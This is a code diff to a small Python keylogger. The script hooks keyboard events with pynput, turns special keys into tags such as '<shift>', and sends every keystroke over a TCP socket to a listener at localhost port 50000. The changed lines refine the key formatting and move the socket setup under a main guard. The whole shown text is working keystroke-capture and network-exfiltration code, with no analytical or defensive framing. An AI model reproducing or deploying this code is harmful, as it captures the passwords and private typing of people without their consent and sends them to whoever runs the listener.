@@ -11,42 +11,43 @@ def key_handler(key):
     elif key==Key.space:
         msg=' '
     elif key==Key.tab:
-        msg='\t'
+        msg='\t' 
     else:
-        msg=str(key).replace("'",'')
+        isSpecial=str(key).find('Key')!=-1 
+        if(isSpecial):
+            msg=str(key)[4:]
+            print(msg)
+            msg = '<'+msg+'>'
+        else:
+            msg=str(key).replace("'",'')
     return msg
 
 
-
-IP="localhost"
-PORT=50000
-s=socket(AF_INET, SOCK_STREAM)
-
-
-
-# create function used by handler to monitoring the keyboard interaction
-
+# create function used by keyboard.listener to monitoring the keyboard interaction
 def on_press(key):
     msg=key_handler(key)
     s.send(msg.encode())
-    
+       
 
 
-keyboard_listener=keyboard.Listener(
-    on_press=on_press 
-)
+if __name__ == '__main__':
+    IP="localhost"
+    PORT=50000
+    s=socket(AF_INET, SOCK_STREAM)
 
-    
-try:
-    s.connect((IP,PORT))
-    keyboard_listener.start()
-    while True:
-        time.sleep(0.1)
+    keyboard_listener=keyboard.Listener(
+        on_press=on_press 
+    )
 
-except:
-    print("Connection lost")
-    
-s.close()
+    try:
+        s.connect((IP,PORT))
+        keyboard_listener.start()
+        while True:
+            time.sleep(0.1)
+    except:
+        print("Connection lost")
+        
+    s.close()
 
 
 
